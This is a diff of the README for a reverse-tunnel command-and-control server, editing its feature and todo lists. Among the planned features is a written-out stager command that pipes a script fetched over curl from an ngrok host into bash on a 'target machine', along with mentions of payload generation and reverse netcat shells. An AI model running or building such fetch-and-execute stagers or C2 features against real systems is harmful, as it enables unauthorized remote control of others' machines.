@@ -3,38 +3,24 @@ RTC2 stands for "Reverse Tunnel C2" because it is a command and control server t
 This also lets all communication happen via https for extra security. As well as this, all communication is encrypted with private/public key pairs.
 
 # Features
-â€¢ Handles multiple clients
+• Handles multiple clients
 
-â€¢ Interactive "command-line" interface with tab autocomplete
+• Interactive "command-line" interface with tab autocomplete
 
-â€¢ Very modular and easy to reuse code
+• Very modular and easy to reuse code
 
-â€¢ Unique-Identifier-based command system (easy to find results of commands)
-
-â€¢ Automatically handles secure port forwarding with ngrok (works behind firewalls)
-
-â€¢ Has function to generate payloads
+• Unique-Identifier-based command system (easy to find results of commands)
 
 # Todo
-â€¢ Utilise private/public key pairs
+• Utilise private/public key pairs
 
-â€¢ Write a function to build said templates with correct server details
+• Finish adding in automated ngrok reverse tunneling
 
-â€¢ Add a stager function to the server so it's possible to do "curl https://serveraddr.ngrok.io/stager | /bin/bash" on target machine (bash script should echo python program line-by-line or just completely bash)
+• Write some simple payload templates
 
-â€¢ Add timestamps to commands
+• Write a function to build said templates with correct server details
 
-â€¢ Sort commands by most recent
-
-â€¢ Add commands to generate one-liner stagers
-
-â€¢ Add auto-reverse-netcat-ngrok command (target: find ver, down ngrok, nc -l, ngrok tcp, send url)
-
-â€¢ On exit: write completed commands into db
-
-â€¢ Add command to import db of completed commands
-
-â€¢ Layered autocomplete (is that a thing??)
+• Add a stager function to the server so it's possible to do "curl https://serveraddr.ngrok.io/stager | /bin/bash" on target machine (bash script should echo python program line-by-line or just completely bash)
 
 # WIP
 This is a huge work-in-progress, so expect lots of bugs and not so many feautures just yet.
